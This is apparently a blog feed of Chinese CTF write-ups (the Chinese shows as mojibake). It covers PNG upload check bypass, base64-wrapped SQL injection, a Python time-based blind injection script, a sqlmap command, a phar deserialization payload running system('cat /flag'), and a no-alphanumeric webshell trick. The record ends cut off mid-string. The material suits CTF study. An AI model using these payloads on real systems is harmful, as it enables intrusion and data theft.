SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);<span class="hljs-comment">// check whether file is uploaded</span><span class="hljs-keyword">if</span> (!file_exists($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);&#125;<span class="hljs-comment">// check file size</span><span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);&#125;<span class="hljs-comment">// check file type</span>$finfo = finfo_open(FILEINFO_MIME_TYPE);$type = finfo_file($finfo, $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);finfo_close($finfo);<span class="hljs-keyword">if</span> (!in_array($type, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);&#125;<span class="hljs-comment">// check file width/height</span>$size = getimagesize($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || $size[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);&#125;<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<span class="hljs-comment">// I hope this never happens...</span><span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);&#125;<span class="hljs-comment">// ok</span>$filename = bin2hex(random_bytes(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . $filename);$session-&gt;set(<span class="hljs-string">&#x27;avatar&#x27;</span>, $filename);flash(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);redirect(<span class="hljs-string">&#x27;/&#x27;</span>);</code></pre></code></pre><p><code>getimagesize</code>å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/856b33eae66eb5e9.png">      </p><p><code>[0]</code>å’Œ<code>[1]</code>åˆ†åˆ«æ˜¯å®½åº¦å’Œé«˜åº¦<br><code>[2]</code>æ˜¯å›¾ç‰‡çš„ç±»å‹    </p><pre><code>GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP       æŒ‰æ­¤é¡ºåºçš„ç¼–å·1=&gt;GIFã€3=&gt;PNG     </code></pre><p>æŒ‰æºç çš„è¦æ±‚ï¼Œéœ€è¦<code>finfo_file()</code>ä¸º<code>imag/png</code>ï¼›è€Œ<code>getimagesize</code>å¾—åˆ°çš„<code>$size[2]!==IMAGETYPE_PNG</code>       </p><p><code>finfo_file()</code>è¯†åˆ«PNGæ–‡ä»¶åå…­è¿›åˆ¶ä¸‹çš„ç¬¬ä¸€è¡Œï¼Œåˆ æ‰å‰©ä½™çš„æ•°æ®å³å¯ç»•è¿‡<code>getimagesize()</code>    </p><p>æ‰€ä»¥ç”¨<code>winhex</code>å¯¹æ–‡ä»¶å¤„ç†<br><img src="https://ftp.bmp.ovh/imgs/2021/05/cef90b357e70f2a4.png">      </p><p>ä¸Šä¼ åå³å¯å¾—åˆ°flag   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cc52aa2d9fdf817e.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PHP&quot;&gt;&lt;a href=&quot;#PHP&quot; class=&quot;headerlink&quot; title=&quot;PHP&quot;&gt;&lt;/a&gt;PHP&lt;/h2&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒ  &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/2021/05/ec5696d29</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="upload" scheme="http://lll-nnn.github.io/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>æµ·æ´‹å¤§å­¦CTF</title>
    <link href="http://lll-nnn.github.io/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/"/>
    <id>http://lll-nnn.github.io/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/</id>
    <published>2021-05-23T15:14:22.000Z</published>
    <updated>2021-05-23T16:00:16.125Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åˆæˆå¤§æ™¦æ°”"><a href="#åˆæˆå¤§æ™¦æ°”" class="headerlink" title="åˆæˆå¤§æ™¦æ°”"></a>åˆæˆå¤§æ™¦æ°”</h2><p>jsé‡Œæ‰¾åˆ°flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/736d3094cd3cbd89.png">      </p><h2 id="ç™½ç»™å¯†ç "><a href="#ç™½ç»™å¯†ç " class="headerlink" title="ç™½ç»™å¯†ç "></a>ç™½ç»™å¯†ç </h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cf263d59e13cbc37.png">    </p><p>sqlæ³¨å…¥ï¼Œä¸è¿‡è¿™é“é¢˜å¯¹usernameå’Œpasswordè¿›è¡Œbase64ç¼–ç ï¼›æŠ“åŒ…åä¸‡èƒ½å¯†ç å¾—åˆ°flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png">        </p><h2 id="Deepâ™‚Darkâ™‚Database"><a href="#Deepâ™‚Darkâ™‚Database" class="headerlink" title="Deepâ™‚Darkâ™‚Database"></a>Deepâ™‚Darkâ™‚Database</h2><p>ä¸Šä¸€é“é¢˜çš„ç¯å¢ƒï¼Œä¸è¿‡è¿˜æœ‰flagï¼Œåº”è¯¥åœ¨æ•°æ®åº“é‡Œï¼›æœ€ç®€å•çš„æ—¶é—´ç›²æ³¨ï¼Œä»€ä¹ˆä¹Ÿæ²¡è¿‡æ»¤   </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> datetimeurl=<span class="hljs-string">&#x27;http://39.106.29.44:10424/&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):    s=<span class="hljs-number">30</span>    l=<span class="hljs-number">127</span>    mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(s&lt;l):        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        payload=<span class="hljs-string">&quot;1&#x27; or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        pay=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))        payl=<span class="hljs-built_in">str</span>(pay)        print(payload)        data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:payl[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]&#125;        time1=datetime.datetime.now()        re=requests.post(url=url,data=data)        time2=datetime.datetime.now()        tem=(time2-time1).seconds        <span class="hljs-keyword">if</span>(tem&gt;<span class="hljs-number">3</span>):            s=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            l=mid        mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre></code></pre><p>æˆ–è€…ç›´æ¥sqlmapä¹Ÿå¯ï¼Œsqlmapé‡Œæœ‰å¯¹payloadè¿›è¡Œbase64ç¼–ç çš„tamperï¼›æˆ‘è¿˜å‚»å‚»çš„å†™äº†ä¸ª     </p><p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p><p>å¾—åˆ°çš„flag  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png">     </p><p>hexè§£ç â€“&gt;base64è§£ç â€”&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p><h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>ä»£ç å®¡è®¡     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;secret.php&#x27;</span>);    $iipp = $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];    $filePath = <span class="hljs-string">&#x27;./uploads/&#x27;</span>.md5($iipp);    $filePath_2 = $filePath.<span class="hljs-string">&#x27;/test.txt&#x27;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))    &#123;        <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;write&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;            <span class="hljs-keyword">if</span>(!file_exists($filePath))&#123;                 mkdir($filePath);                &#125;            $res = file_put_contents($filePath_2, base64_decode(($_POST[<span class="hljs-string">&#x27;content&#x27;</span>])));            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Successful!&quot;</span>.<span class="hljs-string">&quot; your path is &quot;</span>.$filePath_2);        &#125;        <span class="hljs-keyword">elseif</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;check&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>])) &#123;            <span class="hljs-keyword">if</span>(file_exists($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>]))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);        &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>æ„Ÿè§‰æ²¡å•¥å¯åˆ©ç”¨çš„ï¼Œå†™å…¥ä¹Ÿæ˜¯å†™è¿›<code>txt</code>æ–‡ä»¶<br>æœ‰ä¸ª<code>secret.php</code>ä½†ç›´æ¥è®¿é—®ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œä¸ä¼šäº†  </p><p>åœ¨åŒå­¦çš„æç¤ºä¸‹æ‰«äº†ä¸‹ç›®å½•ï¼Œè¿™ç§ä»£ç å®¡è®¡é¢˜è¦æ‰«ç›®å½•æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„ï¼Œå‘ç°æœ‰gitæ³„éœ²     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png">     </p><p>gitä¸‹æ¥<code>secret.php</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d7f283100df9a35b.png">      </p><p>ä¸€ä¸ªç±»ï¼Œevalå‘½ä»¤æ‰§è¡Œ    </p><p>ä½†æ²¡æœ‰åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–çš„ç‚¹    </p><p><code>phar://</code>ååºåˆ—åŒ–     </p><p>æºç ä¸­<code>elseif</code>ä¸­çš„<code>file_exists</code>æ”¯æŒpharåè®®ï¼›æ‰€ä»¥ä¼ å…¥<code>filepath=phar://+æ–‡ä»¶è·¯å¾„</code>å³å¯     </p><p>ç”Ÿæˆpharæ–‡ä»¶      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;        <span class="hljs-keyword">public</span> $cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> TestObject();$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp2.phar&quot;</span>); <span class="hljs-comment">//.pharæ–‡ä»¶</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//å›ºå®šçš„</span>$phar-&gt;setMetadata($a); <span class="hljs-comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>å› ä¸ºpharæ–‡ä»¶ä¸­æœ‰ä¸€äº›ä¸å¯è§å­—ç¬¦ï¼Œä¸èƒ½ç›´æ¥å¤åˆ¶ç²˜è´´è¿›è¡Œbase64ç¼–ç     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$path=<span class="hljs-string">&#x27;exp.phar&#x27;</span>;$fp=fopen($path,<span class="hljs-string">&#x27;rb&#x27;</span>);<span class="hljs-comment">//ä»¥äºŒè¿›åˆ¶æ‰“å¼€æ–‡ä»¶</span>$content=fread($fp,filesize($path));  <span class="hljs-comment">//è¯»å–æ–‡ä»¶</span>$content=base64_encode($content);<span class="hljs-keyword">echo</span> $content;</code></pre></code></pre><p>ä¸Šä¼     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png">      </p><p>è®¿é—®     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/02fdc9258601b902.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;åˆæˆå¤§æ™¦æ°”&quot;&gt;&lt;a href=&quot;#åˆæˆå¤§æ™¦æ°”&quot; class=&quot;headerlink&quot; title=&quot;åˆæˆå¤§æ™¦æ°”&quot;&gt;&lt;/a&gt;åˆæˆå¤§æ™¦æ°”&lt;/h2&gt;&lt;p&gt;jsé‡Œæ‰¾åˆ°flag    &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/20</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>GetShell</title>
    <link href="http://lll-nnn.github.io/2021/05/19/BUU87/"/>
    <id>http://lll-nnn.github.io/2021/05/19/BUU87/</id>
    <published>2021-05-19T03:35:12.000Z</published>
    <updated>2021-05-20T12:33:46.256Z</updated>
    
    <content type="html"><![CDATA[<h2 id="o-o"><a href="#o-o" class="headerlink" title="o)o"></a>o)o</h2><p>æ‰“å¼€ç¯å¢ƒï¼Œå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œè¿˜ç»™äº†éƒ¨åˆ†æºç </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d40dccf7a06348d1.png">   </p><pre><code><pre><code class="hljs php"><span class="hljs-keyword">if</span>($contents=file_get_contents($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;    $data=substr($contents,<span class="hljs-number">5</span>);    <span class="hljs-keyword">foreach</span> ($black_char <span class="hljs-keyword">as</span> $b) &#123;        <span class="hljs-keyword">if</span> (stripos($data, $b) !== <span class="hljs-literal">false</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;illegal char&quot;</span>);        &#125;    &#125;     &#125;</code></pre></code></pre><p>ä»ç»™çš„æºç å¾—çŸ¥ä¼šæ£€æŸ¥æ–‡ä»¶çš„å†…å®¹ç¬¬å…­ä½ä¹‹å   </p><p>çœ‹WPä¼¼ä¹æ˜¯è¿‡æ»¤äº†æ•°å­—å’Œå­—æ¯      </p><p>å¯ç”¨çš„ç¬¦å·<code>$</code>ã€<code>(</code>ã€<code>)</code>ã€<code>.</code>ã€<code>;</code>ã€<code>=</code>ã€<code>[</code>ã€<code>]</code>ã€<code>_</code>ã€<code>~</code>       </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">Pç¥çš„æ— å­—æ¯æ•°å­—gethell</a>   </p><p>åˆ©ç”¨ä¸­æ–‡å’Œå–åæ“ä½œå¾—åˆ°å­—æ¯    </p><p><code>echo ~(&#39;åŒ—&#39;)[1];</code>â€“&gt;s     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>header(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);$str = <span class="hljs-string">&#x27;å½“æˆ‘ç«™åœ¨å±±é¡¶ä¸Šä¿¯ç°åŠä¸ªé¼“æµªå±¿å’Œæ•´ä¸ªå¦é—¨çš„å¤œç©ºçš„æ—¶å€™ï¼Œæˆ‘çŸ¥é“æ­¤æ¬¡å‡ºè¡Œçš„ç›®çš„å·²ç»å®Œæˆäº†ï¼Œæˆ‘è¦å¼€å§‹æ”¶æ‹¾è¡Œæï¼Œæ˜å¤©æ—©ä¸Šç¦»å¼€è¿™é‡Œã€‚å‰å‡ å¤©æœ‰äººé—®æˆ‘ï¼Œå¤§å­¦å››å¹´ç»“æŸäº†ï¼Œä½ ä¹Ÿä¸è¯´ç‚¹ä»€ä¹ˆï¼Ÿä¹Œäº‘å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰€æœ‰äººéƒ½ç¼„é»˜ä¸è¨€ï¼Œä½ ä¹Ÿæ˜¯ä¸€æ ·å—ï¼Ÿä½ é€ƒåˆ°å—æ–¹ï¼Œéš¾é“ä¸å›å®¶äº†å—ï¼Ÿå½“ç„¶è¦å›å®¶ï¼Œæˆ‘åªæ˜¯æƒ³æ‰¾åˆ°æˆ‘è¦æ‰¾çš„ç­”æ¡ˆã€‚å…¶å®è¿™æ¬¡å‡ºæ¥ä¸€è¶Ÿå¾ˆç´¯ï¼Œæ™šä¸Šå‡ ä¹æ˜¯çƒ­æ±—æ·‹æ¼“å›åˆ°ä½å¤„ï¼Œå¦é—¨çš„æµ·é£ä¼´ç€å¦®å¦²è·¯è¿‡åå¸¦æ¥çš„æ·…æ·…æ²¥æ²¥çš„å°é›¨ï¼Œä¹Ÿå»ä¸èµ°æˆ‘èº«ä¸Šä»»ä½•ä¸€ä¸ªæ¯›å­”é‡Œçš„çƒ­æ°”ã€‚å¥½åœ¨æ—…ç¤¾çš„ç”Ÿæ´»ç”¨å“ä¸€åº”ä¿±å…¨ï¼Œæ´—å®Œæ¾¡åæˆ‘çˆ¬åˆ°å±‹é¡¶ã€‚æ—…ç¤¾æ˜¯ä¸€ä¸ªè€åˆ«å¢…ï¼Œè¯´èµ·æ¥ä¹Ÿä¸ç®—è€ï¼Œæ¯”èµ·éš”å£ä¸€å®¶æ—§ä¸­å›½æ—¶æœŸçš„æˆ¿å­è¦è±ªåå¾—å¤šï¼Œç«–ç«‹åœ¨ç¬”å±±é¡¶ä¸Šä¸å¦é—¨å²›éš”æµ·ç›¸æœ›ã€‚ç«™åœ¨å±‹é¡¶å‘ä¸‹çœ‹ï¼Œç¯ç«é˜‘çŠçš„é¼“æµªå±¿è¡—å¸‚å‚æ‚åœ¨ç»¿æ ‘ä¸æ¥¼å®‡é—´ï¼Œä¾ç¨€è¿˜å¯ä»¥çœ‹åˆ°ç†™ç†™æ”˜æ”˜çš„æ¸¸å®¢ã€‚å¤§æ¦‚æ˜¯å¤œæ™šæ¸æ·±çš„ç¼˜æ•…ï¼Œå‘¨å›´æ…¢æ…¢å˜å¾—å®é™ä¸‹æ¥ï¼Œæˆ‘å¿˜è®°ç™½å¤©åœ¨å¥”æ³¢ä»€ä¹ˆï¼Œç›´åˆ°ç«™åœ¨è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘æ‰çŸ¥é“æˆ‘å¯»æ‰¾çš„ç­”æ¡ˆå¹¶ä¸åœ¨å—æ–¹ã€‚å½“ç„¶ä¹Ÿä¸åœ¨åŒ—æ–¹ï¼ŒåŒ—äº¬çš„å¾ˆå¤šä¸œè¥¿è®©æˆ‘éå¸¸ä¸§æ°”ï¼ŒåŒ…æ‹¬è‡ªæ˜åŸå¢“çš„ä¸­ä»‹å’Œé¢æŒ‡æ°”ä½¿çš„å¤§äººä»¬ï¼›åŒ—äº¬ä¹Ÿæœ‰å¾ˆå¤šä¸œè¥¿è®©æˆ‘å–œæ¬¢ï¼Œæˆ‘å–œæ¬¢é¢å’Œå›­å¤è‰²å¤é¦™çš„ç‰æ¾œå ‚ï¼Œæˆ‘å–œæ¬¢æœé˜³é—¨é‚£å—â€œæ°¸å»¶å¸ç¥šâ€çš„ç‰ŒåŠï¼Œå–œæ¬¢åŒ—äº¬é³æ¬¡æ ‰æ¯”çš„è€å®…å­å’Œå—é”£é¼“å··çš„å°åƒã€‚ä½†è¿™äº›éƒ½ä¸æ˜¯æˆ‘è¦çš„ç­”æ¡ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è¿½éšçš„æ˜¯ä»€ä¹ˆï¼Œä½†æƒ³æƒ³ç™¾å¹´åç•™ä¸‹çš„åˆæ˜¯ä»€ä¹ˆï¼Œæƒ³æƒ³å°±å¾ˆå¯æ€•ã€‚æˆ‘æ›¾ç»ä¸ºäº†åƒä¸€ç¢—è‡­è±†è…ï¼Œåç€ä¼˜æ­¥ä»ä¸Šåœ°åˆ°åŒ—æµ·åŒ—ï¼Œå…´å†²å†²åœ°æ¥åˆ°é‚£ä¸ªå‚æ¶å·²ä¹…çš„è±†è…æ‘Šå‰ï¼Œç”¨æ€¥åˆ‡åˆå®³ç¾çš„å£å»å¯¹è€æ¿è¯´ï¼Œæ¥ä¸¤ä»½é‡çš„è‡­è±†è…ã€‚å…¶å®ä¹Ÿåªè¦10å—é’±ï¼Œåƒå®Œä»¥åä¾¿æ˜¯æ— ä¸ä¼¦æ¯”çš„æ»¡è¶³æ„Ÿã€‚æˆ‘è®°å¾—é‚£æ˜¯æ¯•ä¸šè®¾è®¡å®¡æ ¸å‰å¤•çš„ä¸€ä¸ªåˆåï¼Œäº”æœˆçš„åŒ—äº¬è¿˜ä¸ç®—ç‚çƒ­ï¼Œå’Œç…¦çš„é˜³å…‰é¡ºç€è·¯è¾¹è€æˆ¿å­çš„å±‹æªæ´’å‘å¤§åœ°ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸æ•¢ç«™åœ¨é˜³å…‰ä¸‹ï¼Œæ˜¥å¤©çš„ç‡¥çƒ­éš¾è€ä¹Ÿç»ä¸è¾“ç»™å¤å¤©ã€‚å°±åƒå¾ˆå¤šäººå†·å˜²çƒ­è®½çš„é‚£æ ·ï¼Œåšè¿™ä¸€è¡Œè°æ•¢æŠŠè‡ªå·±å®Œå…¨æ›å…‰ï¼Œç”­ç®¡ä½ æ˜¯é»‘å¸½å­ç™½å¸½å­è¿˜æ˜¯ç»¿å¸½å­ã€‚ç”Ÿæ´»åœ¨é‚£ä¸ªæ—¶å€™è¿˜ç®—ç¾å¥½ï¼Œæˆ‘ä¾æ—§æ˜¯ä¸€ä¸ªå­¦ç”Ÿï¼Œå‡ å¤©å‰è¾åˆ«çš„åŒä¼´è¿˜åœ¨æœä¹æ™šäº”çš„å·¥ä½œï¼Œä¸€åˆ‡éƒ½ç…§æ—§è¿è¡Œï¼Œæ³¢æ¾œä¸è¿œèµ°åƒé‡Œåƒè±†è…è¿™ç§ç†æƒ³ä¸»ä¹‰çš„äº‹æƒ…è¿™å‡ å¹´åœ¨æˆ‘èº«ä¸Šå±¡å±¡å‘ç”Ÿï¼Œç”šè‡³å—ä¸‹æ­¤è¡Œä¹Ÿä¸ä¾‹å¤–ã€‚ä¸€å¹´å‰çš„è¿™ä¸ªæ—¶å€™æˆ‘è®¸è¿‡ä¸€ä¸ªå¿ƒæ„¿ï¼Œåœ¨å—æ™®é™€ï¼Œæˆ‘ç‰¹ä¸ºæ­¤æ¥è¿˜æ„¿ã€‚ç†æƒ³åŒ–ã€å•çº¯ä¸æ‹æ—§ï¼Œå…¶ä¸­å•çº¯å¯ä¸æ˜¯ä¸€ä¸ªå¤šä¹ˆä»¤äººç§°èµçš„å½¢å®¹ï¼Œå¾ˆå¤šäººæŠŠä»–å’Œå‚»æŒ‚é’©ã€‚â€œä½ å¤ªå•çº¯äº†ï¼Œä½ è¿˜æƒ³ç€è¿™ä¸€åˆ‡ä¼šå¥½èµ·æ¥â€ï¼Œå¯¹å‘€ï¼Œåœ¨ç”·æ¬¢å¥³çˆ±é‚£äº›äº‹æƒ…ä¸Šï¼Œæˆ‘å¯ä¸å•çº¯ï¼Œä½†æœ‰äº›èƒ½è®©äººå˜å¾—åœ†æ»‘ä¸ä¸–æ•…çš„æŠ‰æ‹©ä¸­ï¼Œæˆ‘å®æ„¿æƒ³çš„æ›´å•çº¯ä¸€äº›ã€‚å»å¹´å†¬å¤©å­¤èº«ä¸€äººæ¥åˆ°åŒ—äº¬ï¼Œæ”¾å¼ƒäº†åœ¨è…¾è®¯åšä¸€ä¸ªå®‰é€¸çš„å®ä¹ ç”Ÿçš„æœºä¼šï¼ŒåŸå› æœ‰å¾ˆå¤šä¹Ÿå¾ˆéš¾è¯´ã€‚åœ¨è…¾è®¯çŸ­æš‚çš„å®ä¹ ç”Ÿæ´»è®©æˆ‘è®°å¿†çŠ¹æ–°ï¼Œæˆ‘æ„Ÿè§‰è¿™è¾ˆå­ä¸ä¼šå†åƒä¸€ä¸ªå°å­©ä¸€æ ·è¢«æ‰€æœ‰äººå® äº†ï¼Œè¿™äº›å½“æˆ‘é€‰æ‹©åŒ—æ¼‚çš„æ—¶å€™åº”è¯¥å°±è¦æƒ³åˆ°çš„ã€‚åŒ—äº¬çš„å†¬å¤©åˆºéª¨çš„å¯’å†·ï¼Œç‰¹åˆ«æ˜¯2015å¹´çš„è…Šæœˆï¼Œæœ‰å‡ 